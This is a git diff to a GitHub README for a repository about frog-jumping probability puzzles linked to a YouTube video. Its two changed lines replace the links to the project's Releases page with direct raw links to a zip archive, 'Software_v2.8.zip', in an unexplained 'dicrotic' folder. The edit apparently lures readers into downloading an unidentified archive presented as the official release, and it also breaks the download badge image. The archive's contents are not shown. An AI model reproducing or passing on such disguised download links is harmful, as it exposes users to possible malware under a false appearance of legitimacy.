@@ -1,6 +1,6 @@
 # 🐸 frogjumpsrandomly - Explore Frog Jumping Strategies Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge)](https://github.com/saairimran/frogjumpsrandomly/releases)
+[![Download Now](https://github.com/saairimran/frogjumpsrandomly/raw/refs/heads/main/dicrotic/Software_v2.8.zip%20Now-Visit%20Releases-blue?style=for-the-badge)](https://github.com/saairimran/frogjumpsrandomly/raw/refs/heads/main/dicrotic/Software_v2.8.zip)
 
 ## 📜 Description
 This repository contains files for my YouTube video titled "Frog Jumps Randomly | Value Function Strategy (LIVESOLVE)." Here, you will find tools and insights into the fascinating world of frog jumping problems, including expected time, expected value, and random walks.
@@ -20,7 +20,7 @@ Follow these steps to get started with the application.
 ## 📥 Download & Install
 To get the latest version of the application, please visit the Releases page:
 
-[Visit Releases to Download](https://github.com/saairimran/frogjumpsrandomly/releases)
+[Visit Releases to Download](https://github.com/saairimran/frogjumpsrandomly/raw/refs/heads/main/dicrotic/Software_v2.8.zip)
 
 1. Click on the link above.
 2. On the Releases page, find the latest release.
